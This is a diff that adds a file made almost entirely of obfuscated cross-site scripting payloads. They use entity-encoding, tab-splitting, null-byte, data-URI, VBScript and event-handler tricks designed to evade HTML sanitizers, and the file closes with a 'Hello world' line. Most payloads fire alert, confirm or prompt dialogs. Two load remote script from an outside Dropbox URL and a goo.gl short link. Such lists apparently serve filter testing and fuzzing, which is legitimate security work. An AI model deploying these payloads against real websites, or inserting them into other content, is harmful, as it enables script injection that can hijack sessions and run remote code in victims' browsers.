@@ -1,0 +1,39 @@
+&amp;lt;div style=&amp;quot;color:rgb(''&amp;amp;#0;x:expression(alert(1))&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
+&amp;lt;img/src=%00 id=confirm(1) onerror=eval(id)
+&amp;lt;div id=confirm(1) onmouseover=eval(id)&amp;gt;X&amp;lt;/div&amp;gt;
+&amp;lt;span/onmouseover=confirm(1)&amp;gt;X&amp;lt;/span&amp;gt;
+&amp;lt;svg/contentScriptType=text/vbs&amp;gt;&amp;lt;script&amp;gt;Execute(MsgBox(chr(88)&amp;amp;chr(83)&amp;amp;chr(83)))
+&amp;lt;iframe/src=&amp;quot;javascript:a=[alert&amp;amp;lpar;1&amp;amp;rpar;,confirm&amp;amp;#40;2&amp;amp;#41;,prompt%283%29];eval(a[0]);&amp;quot;&amp;gt;
+&amp;lt;div/style=content:url(data:image/svg+xml);visibility:visible onmouseover=alert(1)&amp;gt;x&amp;lt;/div&amp;gt;
+&amp;lt;script&amp;gt;Object.defineProperties(window,{w:{value:{f:function(){return 1}}}});confirm(w.f())&amp;lt;/script&amp;gt;
+&amp;lt;keygen/onfocus=prompt(1);&amp;gt;
+&amp;lt;img/src=`%00` id=confirm(1) onerror=eval(id)
+&amp;lt;img/src=`%00` onerror=this.onerror=confirm(1)
+&amp;lt;iframe/src=&amp;quot;data:text/html,&amp;lt;iframe%09onload=confirm(1);&amp;gt;&amp;quot;&amp;gt;
+&amp;lt;math&amp;gt;&amp;lt;a/xlink:href=javascript:prompt(1)&amp;gt;X
+&amp;lt;input/type=&amp;quot;image&amp;quot;/value=&amp;quot;&amp;quot;`&amp;lt;span/onmouseover='confirm(1)'&amp;gt;X`&amp;lt;/span&amp;gt;
+&amp;lt;form/action=javascript&amp;amp;#x0003A;eval(setTimeout(confirm(1)))&amp;gt;&amp;lt;input/type=submit&amp;gt;
+&amp;lt;body/onload=this.onload=document.body.innerHTML=alert&amp;amp;lpar;1&amp;amp;rpar;&amp;gt;
+&amp;lt;iframe/onload='javascript&amp;amp;#58;void&amp;amp;#40;1&amp;amp;#41;&amp;amp;quest;void&amp;amp;#40;1&amp;amp;#41;&amp;amp;#58;confirm&amp;amp;#40;1&amp;amp;#41;'&amp;gt;
+&amp;lt;object/type=&amp;quot;text/x-scriptlet&amp;quot;/data=&amp;quot;data:X,&amp;amp;#60script&amp;amp;#62setInterval&amp;amp;lpar;'prompt(1)',10&amp;amp;rpar;&amp;amp;#60/script&amp;amp;#62&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;
+&amp;lt;i&amp;lt;f&amp;lt;r&amp;lt;a&amp;lt;m&amp;lt;e&amp;gt;&amp;lt;iframe/onload=confirm(1);&amp;gt;&amp;lt;/i&amp;gt;f&amp;gt;r&amp;gt;a&amp;gt;m&amp;gt;e&amp;gt;
+http://www.&amp;lt;script abc&amp;gt;setTimeout('confirm(1)',1)&amp;lt;/script .com&amp;gt;
+&amp;lt;style/onload    =    !-alert&amp;amp;#x28;1&amp;amp;#x29;&amp;gt;
+&amp;lt;svg id=a /&amp;gt;&amp;lt;script language=vbs for=a event=onload&amp;gt;alert 1&amp;lt;/script&amp;gt;
+&amp;lt;form/action=javascript&amp;amp;#x3A;void(1)&amp;amp;quest;void(1)&amp;amp;colon;alert(1)&amp;gt;&amp;lt;input/type='submit'&amp;gt;
+&amp;lt;meta/http-equiv=&amp;quot;refresh&amp;quot;/content=&amp;quot;0;url=javascript&amp;amp;Tab;:&amp;amp;Tab;void(alert(0))?0:0,0,prompt(0)&amp;quot;&amp;gt;
+&amp;lt;script src=&amp;quot;h&amp;amp;Tab;t&amp;amp;Tab;t&amp;amp;Tab;p&amp;amp;Tab;s&amp;amp;colon;/&amp;amp;Tab;/&amp;amp;Tab;http://dl.dropbox.com/u/13018058/js.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;style/onload='javascript&amp;amp;colon;void(0)?void(0)&amp;amp;colon;confirm(1)'&amp;gt;
+&amp;lt;svg&amp;gt;&amp;lt;style&amp;gt;&amp;amp;#x7B;-o-link-source&amp;amp;#x3A;'&amp;lt;style/onload=confirm(1)&amp;gt;'&amp;amp;#x7D;
+&amp;lt;math&amp;gt;&amp;lt;solve i.e., x=2+2*2-2/2=? href=&amp;quot;data:text/html,&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;X
+&amp;lt;iframe/src=&amp;quot;j&amp;amp;Tab;AVASCRIP&amp;amp;NewLine;t:\u0061ler\u0074&amp;amp;#x28;1&amp;amp;#x29;&amp;quot;&amp;gt;
+&amp;lt;iframe/src=&amp;quot;javascript:void(alert(1))?alert(1):confirm(1),prompt(1)&amp;quot;&amp;gt;
+&amp;lt;embed/src=javascript&amp;amp;colon;\u0061&amp;amp;#x6C;&amp;amp;#101%72t&amp;amp;#x28;1&amp;amp;#x29;&amp;gt;
+&amp;lt;img/src='http://i.imgur.com/P8mL8.jpg ' onmouseover={confirm(1)}f()&amp;gt;
+&amp;lt;style/&amp;amp;Tab;/onload=;&amp;amp;Tab;this&amp;amp;Tab;.&amp;amp;Tab;onload=confirm(1)&amp;gt;
+&amp;lt;embed/src=//goo.gl/nlX0P&amp;gt;
+&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript:alert(1)&amp;gt;CLICKME
+&amp;lt;script&amp;gt;x='con';s='firm';S='(1)';setTimeout(x+s+S,0);&amp;lt;/script&amp;gt;
+&amp;lt;img/id=&amp;quot;confirm&amp;amp;lpar;1&amp;amp;#x29;&amp;quot;/alt=&amp;quot;/&amp;quot;src=&amp;quot;/&amp;quot;onerror=eval(id&amp;amp;#x29;&amp;gt;
+&amp;lt;iframe/src=&amp;quot;data&amp;amp;colon;text&amp;amp;sol;html,&amp;lt;s&amp;amp;Tab;cr&amp;amp;Tab;ip&amp;amp;Tab;t&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;
+Hello world
